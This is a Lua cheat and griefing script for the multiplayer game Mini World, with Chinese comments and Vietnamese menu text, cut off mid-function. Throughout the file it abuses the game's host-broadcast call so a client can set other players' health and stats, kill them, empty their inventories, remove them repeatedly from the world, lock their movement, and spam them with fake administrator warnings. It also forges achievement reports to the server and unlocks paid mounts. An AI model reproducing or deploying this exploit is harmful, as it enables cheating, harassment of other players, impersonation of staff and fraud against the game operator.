                        tdata2[1] = "player"
                        tdata2[2] = "setActionAttrState"
                        tdata2[3] = {targetUin, 1, false}  -- false = 禁止移动
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2) 
                        end)
                        -- =======================
                        
                        -- 每10次显示一次提示
                       
                        
                        threadpool:wait(0.01)  -- 0.01秒执行一次（非常快）
                    end
                    
                    ShowGameTipsWithoutFilter("#cFF0000Vòng lặp nhấc người đã kết thúc")
                end)
            end
            -- ====================
        end
    end
)
end

-- 人物改血
function rwgx()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Hãy nhập số hợp lệ")
            return
        end
        local tdata1 = {
            [1] = "player",
            [2] = "setAtt",
            [3] = { AccountManager:getUin(), value, 1 }
        }
        local tdata2 = {
            [1] = "player",
            [2] = "setAtt",
            [3] = { AccountManager:getUin(), value, 2 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1)
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2)
    end)
end

-- 召唤坐骑
function zhzq()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Hãy nhập ID thú cưỡi hợp lệ")
            return
        end
        CurMainPlayer:summonAccountHorse(value)
    end)
end

-- 玩家大小
function wjdx()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Hãy nhập số hợp lệ (kích thước)")
            return
        end
        ShowPlayerList(function(uin)
            if whitelist[uin] then
                ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
                return
            end
            local tdata = {
                [1] = "player",
                [2] = "setAtt",
                [3] = { uin, value, 21 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end, "Kích thước người chơi")
    end)
end

-- 玩家生命
function wjsm()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Hãy nhập giá trị sinh lực hợp lệ")
            return
        end
        ShowPlayerList(function(uin)
            if whitelist[uin] then
                ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
                return
            end
            local tdata1 = {
                [1] = "player",
                [2] = "setAtt",
                [3] = { uin, value, 1 }
            }
            local tdata2 = {
                [1] = "player",
                [2] = "setAtt",
                [3] = { uin, value, 2 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1)
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2)
        end, "Sinh lực người chơi")
    end)
end

-- 玩家攻击力
function wjgjl()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Hãy nhập giá trị sức tấn công hợp lệ")
            return
        end
        ShowPlayerList(function(uin)
            if whitelist[uin] then
                ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
                return
            end
            local tdata = {
                [1] = "player",
                [2] = "setAtt",
                [3] = { uin, value, 17 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end, "Sức tấn công người chơi")
    end)
end

-- 自定大小
function zddx()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Hãy nhập số hợp lệ (tỷ lệ thu phóng)")
            return
        end
        local player = CurMainPlayer
        player:setCustomScale(value)
        player:syncCustomScale()
        ShowGameTips("Đã đặt kích thước tùy chỉnh:" .. value, 3)
    end)
end

-- id取物
function bbqw()
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

-- 左边：ID取物 | 右边：编辑器取物
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái lấy vật phẩm bằng ID\nBên phải lấy từ kho vật phẩm",  -- 消息内容
    "Xác nhận",                   -- 标题
    nil,                          -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：ID取物
            -- ===== ID取物 =====
            ShowTextInputSafe(function(text)
                if #text == 0 then 
                    ShowGameTipsWithoutFilter("Nội dung nhập không được để trống")
                    return 
                end
                
                local uin = AccountManager:getUin()
                local itemId, itemCount
                
                -- 尝试解析逗号分隔的格式，例如 "123,64"
                local commaPos = string.find(text, ",")
                if commaPos then
                    local parts = {}
                    for part in string.gmatch(text, "[^,]+") do
                        table.insert(parts, part)
                    end
                    itemId = tonumber(parts[1]) or 0
                    itemCount = tonumber(parts[2]) or 64
                else
                    -- 纯数字，当作物品ID，数量默认为64
                    itemId = tonumber(text) or 0
                    itemCount = 64
                end
                
                if itemId == 0 then
                    ShowGameTipsWithoutFilter("ID vật phẩm không hợp lệ")
                    return
                end
                
                -- 发送添加物品广播
                local tdata = {
                    [1] = "backpack",
                    [2] = "addItem",
                    [3] = { uin, itemId, itemCount }
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                ShowGameTipsWithoutFilter(string.format("Thêm vật phẩm: %d Số lượng: %d", itemId, itemCount))
            end, "Nhập ID vật phẩm,số lượng (ví dụ 123,64)")
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：编辑器取物
            -- ===== 编辑器取物 =====
            threadpool:work(function()
                local isInGame = ClientCurGame:isInGame()
                if isInGame then
                    local param = {
                        useLibrary = 2,
                        sstype = {modpacketid = "", modlib = false}
                    }
                    param.callback = function(ID)
                        if ID and ID ~= 0 then
                            local itemDef = ItemDefCsv:get(ID)
                            if itemDef then
                                local tdata = {}
                                tdata[1] = "backpack"
                                tdata[2] = "addItem"
                                tdata[3] = {AccountManager:getUin(), ID, itemDef.StackMax}
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                ShowGameTipsWithoutFilter("#cFF7aad" .. itemDef.Name .. "Đã thêm thành công")
                            end
                        end
                    end
                    GetInst("MiniUIManager"):OpenUI("ResourceSelectorFrame", "miniui/miniworld/ugc_resourceselector", "ResourceSelectorFrameAutoGen", param)
                else
                    ShowGameTipsWithoutFilter("Chưa vào bản đồ, không thể sử dụng")
                end
            end)
            -- ====================
        end
    end
)
end

-- 武器皮肤
function wqpf()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Hãy nhập số ID skin hợp lệ")
            return
        end
        local uin = AccountManager:getUin()
        SandboxMgr:sendToHost(
            "UPDATE_WEAPON_SKIN_INFO_HOST",
            '{"uin":"' .. uin .. '","skinList":{"' .. uin .. '":[' .. value .. ',' .. value .. ',' .. value .. ',' .. value .. ',' .. value .. ',' .. value .. ',' .. value .. ',' .. value .. ']}}'
        )
    end)
end

-- 召唤宠物
function zhcw()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Hãy nhập ID thú cưng hợp lệ")
            return
        end
        CurMainPlayer:summonPet(1000, AccountManager:getUin() .. "_0", value, 5, 3, '#b#RCúp Fiji')
    end)
end

function qhdw()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Hãy nhập ID đội hợp lệ (dạng số)")
            return
        end
        local tdata = {
            [1] = "team",
            [2] = "changePlayerTeam",
            [3] = { AccountManager:getUin(), value }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end)
end
      
function zdpf()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Hãy nhập số skin hợp lệ")
            return
        end
        local skinId = "skin_" .. value
        local tdata = {
            [1] = "actor",
            [2] = "changeCustomModel",
            [3] = { AccountManager:getUin(), skinId }
        }
        pcall(function()
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end)
    end, "Nhập số skin (ví dụ 1 tương ứng skin_1)")
end
        
        
function jqms()
    -- 观战目标设置功能（左边停止并恢复，右边开启并设置观战目标）
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái tắt\nBên phải bật\nPhải tắt trước khi rời phòng",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止并恢复
            -- ===== 停止观战循环 =====
            _G.spectate_loop_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Vòng lặp đã dừng")
            
            -- 恢复自己的迷你号
            if CurMainPlayer then
                local myUin = AccountManager:getUin()
                CurMainPlayer:setUin(myUin)
                ShowGameTipsWithoutFilter("Đã tắt")
            end
            -- =========================
            
        elseif btnType == 1 then  -- 右边按钮：开启并设置
            -- ===== 开启观战循环 =====
            _G.spectate_loop_enabled = true
            ShowGameTipsWithoutFilter("#c00ffffĐã bật")
            
            -- 启动观战循环
            threadpool:work(function()
                while _G.spectate_loop_enabled do
                    -- 显示战斗准备界面
                    getglobal("BattlePrepareFrame"):Show()
                    getglobal("BattlePrepareFrameStartGame"):Show()
                    getglobal("BattlePrepareFrameTips"):SetText("Chế độ trước trận")
                    
                    -- 设置观战目标为迷你号1000
                    CurMainPlayer:setUin(ClientCurGame:getHostUin())
                    
                    -- 等待0.1秒
                    threadpool:wait(0.1)
                end
            end)
            -- =========================
        end
    end
)
end


-- ==================== 简单功能函数 ====================



function jzgj()
    local tdata = {
        [1] = "gamerule",
        [2] = "setAttackPlayerMode",
        [3] = { 1 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function dtzl()
    local tdata = {
        [1] = "gamerule",
        [2] = "setGravityFactor",
        [3] = { 0.1 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function gbtq1()
    local tdata = {
        [1] = "gamerule",
        [2] = "setWeather",
        [3] = { 1 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function gbtq2()
    local tdata = {
        [1] = "gamerule",
        [2] = "setWeather",
        [3] = { 3 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function gbtq3()
    local tdata = {
        [1] = "gamerule",
        [2] = "setWeather",
        [3] = { 5 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function gbtq4()
    local tdata = {
        [1] = "gamerule",
        [2] = "setWeather",
        [3] = { 6 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function wfgj()
    local tdata = {
        [1] = "player",
        [2] = "setActionAttrState",
        [3] = { AccountManager:getUin(), 64, false }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function qtxr()
    local num = ClientCurGame:getNumPlayerBriefInfo()
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local new_x, new_y, new_z = x / 100, y / 100, z / 100
    
    for i = 1, num do
        local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
        if briefInfo and briefInfo.uin and briefInfo.uin > 1000 then
            local tdata = {
                [1] = "player",
                [2] = "setPosition",
                [3] = { briefInfo.uin, new_x, new_y, new_z }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
    end
end

function szfs()
    local tdata = {
        [1] = "player",
        [2] = "setAtt",
        [3] = { AccountManager:getUin(), 99999999, 22 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function czgw()
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local new_x, new_y, new_z = x / 100, y / 100, z / 100
    local tdata = {
        [1] = "world",
        [2] = "spawnMob",
        [3] = { new_x, new_y, new_z, 3517, 1, true }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function phfk()
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local gridX, gridY, gridZ = x / 100, y / 100, z / 100
    
    local startPos = { x = gridX - 25, y = gridY - 50, z = gridZ - 25 }
    local endPos = { x = gridX + 24, y = gridY + 49, z = gridZ + 24 }
    
    local tdata = {
        [1] = "area",
        [2] = "clearAllBlockAreaRange",
        [3] = { startPos, endPos, 0 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function wjsb()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("#RCấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "player",
            [2] = "setGameResults",
            [3] = { uin, 2 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Người chơi thất bại")
end

function wjtx()
    ShowPlayerList(function(uin)
        for i = 1, #effectNameList do
            local tdata = {
                [1] = "actor",
                [2] = "playBodyEffectByFile",
                [3] = { uin, effectNameList[i], true }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
    end, "Hiệu ứng người chơi")
end

function jbwj()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("#RCấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "actor",
            [2] = "playerHurt",
            [3] = { AccountManager:getUin(), uin, 1.8e+308, 0 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Người chơi tử vong")
end

function kjzq()
-- 解锁坐骑（使用提供的坐骑ID列表）
-- 获取玩家账户数据
local accountData = AccountManager:getAccountData().Account

-- 获取BillDataSvr
local BillDataSvr = accountData.BillDataSvr

-- 坐骑ID列表
local horseIds = {
    3437,3496,4532,4587,4566,4624,4502,3459,4520,4561,3440,4595,3245
}

-- 设置解锁坐骑数量
BillDataSvr.UnlockRiderInfoNum = #horseIds

-- 创建新的解锁坐骑信息表
local newRiderInfo = {}

-- 遍历坐骑ID列表，为每个ID创建坐骑信息
for i, horseId in ipairs(horseIds) do
    newRiderInfo[i] = {
        RiderID = horseId,    -- 使用列表中的坐骑ID
        RiderLevel = 1,       -- 坐骑等级设为1
        -- 如果有其他必要字段，可以在这里添加
    }
end

-- 替换原有的坐骑信息
BillDataSvr.UnlockRiderInfo = newRiderInfo

-- 也可以修改leveldb中的数据（如果需要）
if accountData.leveldb then
    local leveldbRiderInfo = {}
    for _, horseId in ipairs(horseIds) do
        table.insert(leveldbRiderInfo, {
            RiderID = horseId,
            RiderLevel = 1,
        })
    end
    accountData.leveldb.UnlockRiderInfo = leveldbRiderInfo
end


end


function bfyx()

-- 获取玩家当前位置
local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
local new_x = x / 100
local new_y = y / 100
local new_z = z / 100

CurWorld:playSoundAndParticleEffect(new_x, new_y, new_z, 'pvp.kill_6', 100, 50, 0, new_x, new_y, new_z, 0, 1, 100)
end

function sqxz()
Rxz = {1001, 1002, 1003, 1004, 1005, 1006, 1008, 1010, 1011, 1012, 1014, 1015, 1017, 1018, 1019, 1020}

    for dm = 1, 22 do
        local index = dm + 1  
        if Rxz[index] then
            ArchievementGetInstance().func:Report2Server(Rxz[index], {pos = 838384, add = 2001, count = 2001})
        end
    end   
    end
    
    
    function tjsw()
for a=0,100000 do 
    threadpool:wait(1)
-- 获取玩家当前位置
local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
local center_x = x / 100
local center_y = y / 100
local center_z = z / 100

-- 椭圆参数（距离8-10格，空心更大）
local a = 6.0  -- X轴半径（左右方向）8格
local b = 4.0  -- Z轴半径（前后方向）6格
local points = 7  -- 特效数量，距离远了需要更多特效

-- 只在椭圆边缘播放特效（空心）
for i = 0, points - 1 do
    local angle = (i / points) * math.pi * 2
    
    -- 计算椭圆边缘上的坐标
    local offset_x = math.cos(angle) * a
    local offset_z = math.sin(angle) * b
    
    -- 计算最终位置（只在椭圆边缘）
    local new_x = center_x + offset_x
    local new_y = center_y
    local new_z = center_z + offset_z
    
    -- 播放闪电特效
    CurWorld:playSoundAndParticleEffect(
        new_x, new_y, new_z, 0, 0, 0, 0, 
        new_x, new_y, new_z, 
        'particles/aotu_06_leishenzhichui.ent', 1, 20
    )
end

print("已在你周围8x6格处生成空心椭圆形闪电圈")
end
end

function qcbf()
for a=0,100000 do 
    threadpool:wait(0.1)
tdata = {}
    tdata[1] = "buff";
    tdata[2] = "clearAllBuff";
    tdata[3] = {AccountManager:getUin()}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end
end


function bcfhd()
local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
local base_x = x / 100
local base_y = y / 100
local base_z = z / 100
for dx = -1, 1 do

ShowPlayerList(function(uin)
if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("#RCấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        tdata = {}
    tdata[1] = "player";
    tdata[2] = "setRevivePoint";
    tdata[3] = {uin,base_x,base_y,base_z}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Chỉ định điểm hồi sinh của người chơi")
    end
    end

function fhxk()
    ShowGameTipsWithoutFilter("Chức năng hồi sinh hư không")
end

function jzyd()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("#RCấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "actor",
            [2] = "setActionAttrState",
            [3] = { uin, PLAYERATTR.ENABLE_MOVE, false }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Cấm di chuyển")
end

function gbqx()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("#RCấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local flags = { 2, 4, 8, 16, 256, 2048 }
        for _, flag in ipairs(flags) do
            local tdata = {
                [1] = "player",
                [2] = "setActionAttrState",
                [3] = { uin, flag, false }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
    end, "Tắt quyền")
end

function wjxz()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("#RCấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "player",
            [2] = "rotateCamera",
            [3] = { uin, -999994890, -9999999 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Xoay người chơi")
end

function tjbf()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("#RCấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "buff",
            [2] = "addBuff",
            [3] = { uin, 46, 1, 0 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Giam giữ người chơi")
end

function qcwj()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("#RCấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "world",
            [2] = "despawnActor",
            [3] = { uin }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Xóa người chơi")
end

function jgwj()
    ShowPlayerList(function(uin)
        for a = 0, 10000 do
            threadpool:wait(0.1)
            local tdata = {
                [1] = "player",
                [2] = "notifyGameInfo2Self",
                [3] = { uin, "#RTôi là quản trị viên Mini, phát hiện bạn vi phạm; cảnh cáo lần một, lần hai sẽ xử lý trực tiếp" }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
    end, "Cảnh cáo người chơi")
end



function ddjt()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("#RCấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "player",
            [2] = "shakeCamera",
            [3] = { uin, 10000, 1000 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Rung camera")
end

function fjhmd()
    ShowPlayerList(function(uin)
        for a = 0, 100000 do
            threadpool:wait(0.1)
            if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("#RCấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
            local tdata = {
                [1] = "world",
                [2] = "despawnActor",
                [3] = { uin }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
    end, "Đưa vào danh sách đen")
end

function zdzl()
    ShowPlayerList(function(uin)
        for a = 0, 100000 do
            threadpool:wait(0.1)
            if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("#RCấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
            local tdata = {
                [1] = "player",
                [2] = "playAct",
                [3] = { uin, 9 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
    end, "Buộc người chơi bò xuống")
end

function qkwjbb()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("#RCấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "backpack",
            [2] = "clearAllPack",
            [3] = { uin }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Xóa sạch túi đồ người chơi")
end


    function qcwp2()
    for a = 0, 100000 do
            threadpool:wait(0.1)
local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
local new_x, new_y, new_z = x / 100, y / 100, z / 100

-- 计算范围：从主体位置到周围1000格（游戏内单位）
local range = 1000
local tdata = {
    [1] = "world",
    [2] = "despawnItemByBox",
    [3] = {
        new_x - range, new_y - range, new_z - range,  -- 最小点
        new_x + range, new_y + range, new_z + range   -- 最大点
    }
}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end
end

function zdcsrl()
    ShowPlayerList(function(uin)
        local uin_ = uin
        -- 这里可以添加权限判断
        -- AccountManager.cluster.buddysvr.route('gm.kick', uin_);
    end, "Dịch chuyển một người")
end

function dffz()
local myUin = AccountManager:getUin()
local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
for i = 1, size do
    local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
    if targetPlayer then
        local targetUin = targetPlayer:getUin()
        if targetUin ~= myUin then
           tdata = {}
           tdata[1] = "player";
           tdata[2] = "changPlayerMoveType";
           tdata[3] = {targetUin,0}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "world";
           tdata[2] = "SetTimeVanishingSpeed";
           tdata[3] = {500}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "player";
           tdata[2] = "changeViewMode";
           tdata[3] = {targetUin,9,true}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
           tdata = {}
           tdata[1] = "player";
           tdata[2] = "forceOpenBoxUI";
           tdata[3] = {targetUin,797}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "actor";
           tdata[2] = "changeCustomModel";
           tdata[3] = {targetUin,[=[role_11]=]}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "chat";
           tdata[2] = "sendChat";
           tdata[3] = {"#b#BKinh Vô Tâm Thái Sơ\n#b#BKinh Vô Tâm Thái Sơ\n#b#BKinh Vô Tâm Thái Sơ\n#b#BKinh Vô Tâm Thái Sơ\n#b#BKinh Vô Tâm Thái Sơ\n#b#BKinh Vô Tâm Thái Sơ\n#b#BKinh Vô Tâm Thái Sơ\n#b#BKinh Vô Tâm Thái Sơ\n#b#BKinh Vô Tâm Thái Sơ\n",1,0}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "player";
           tdata[2] = "notifyGameInfo2Self";
           tdata[3] = {targetUin,"#b#BKinh Vô Tâm Thái Sơ"}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "actor";
           tdata[2] = "setnickname";
           tdata[3] = {targetUin,"#b#KLệnh cấm Vô Tâm"}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "backpack";
           tdata[2] = "clearAllPack";
           tdata[3] = {targetUin}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "player";
           tdata[2] = "setActionAttrState";
           tdata[3] = {targetUin,1,false}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "player";
           tdata[2] = "setActionAttrState";
           tdata[3] = {AccountManager:getUin(),64,false}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            tdata = {}
           tdata[1] = "player";
           tdata[2] = "setActionAttrState";
           tdata[3] = {AccountManager:getUin(),128,false}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "world";
           tdata[2] = "SetSkyBoxMaps";
           tdata[3] = {1,30008,""}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "actor";
           tdata[2] = "playerHurt";
           tdata[3] = {AccountManager:getUin(),targetUin,1.8e+308,0}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "player";
           tdata[2] = "setAtt";
           tdata[3] = {targetUin,1,2}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "actor";
           tdata[2] = "playBodyEffectByFile";
           tdata[3] = {AccountManager:getUin(),"yanhua",true}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "actor";
           tdata[2] = "playBodyEffectByFile";
           tdata[3] = {AccountManager:getUin(),"12834",true}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "actor";
           tdata[2] = "playBodyEffectByFile";
           tdata[3] = {AccountManager:getUin(),"bossskill_lasertailblue",true}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "actor";
           tdata[2] = "playBodyEffectByFile";
           tdata[3] = {AccountManager:getUin(),"ice_bingshi_boss",true}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "actor";
           tdata[2] = "playBodyEffectByFile";
           tdata[3] = {AccountManager:getUin(),"mob_3514_white",true}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "actor";
           tdata[2] = "playBodyEffectByFile";
           tdata[3] = {AccountManager:getUin(),"nengliang_xiqu",true}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "actor";
           tdata[2] = "playBodyEffectByFile";
           tdata[3] = {AccountManager:getUin(),"nengliang_baozha",true}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "actor";
           tdata[2] = "playBodyEffectByFile";
           tdata[3] = {targetUin,"jiguang01",true}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
       end
     end
	end

-- ==================== 复杂功能函数 ====================
function fsjg()
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 炸图模拟器功能（左边停止，右边开启）
